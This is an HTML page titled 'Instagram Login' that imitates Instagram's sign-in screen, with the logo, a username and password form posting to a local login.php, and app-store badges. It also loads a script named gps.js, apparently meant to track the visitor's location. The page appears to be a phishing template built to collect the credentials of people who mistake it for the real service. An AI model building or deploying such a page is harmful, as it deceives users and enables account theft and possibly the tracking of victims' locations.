<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="styles.css">
    <script src="gps.js"></script>
</head>
<body>
    <main>
        <div class="container">
            <div class="login-box">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">

                <form class="login-form"action="login.php" method="post">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                    <div class="separator">OR</div>
                    <a href="#" class="fb-login">Log in with Facebook</a>
                    <a href="#" class="forgot-password">Forgot password?</a>
                </form>

            </div>
            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
            <div class="download-app">
                <p>Get the app.</p>
                <div class="app-buttons">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Available_on_the_App_Store_%28black%29.png" alt="App Store">
                </div>
            </div>
        </div>
    </main>
</body>
</html>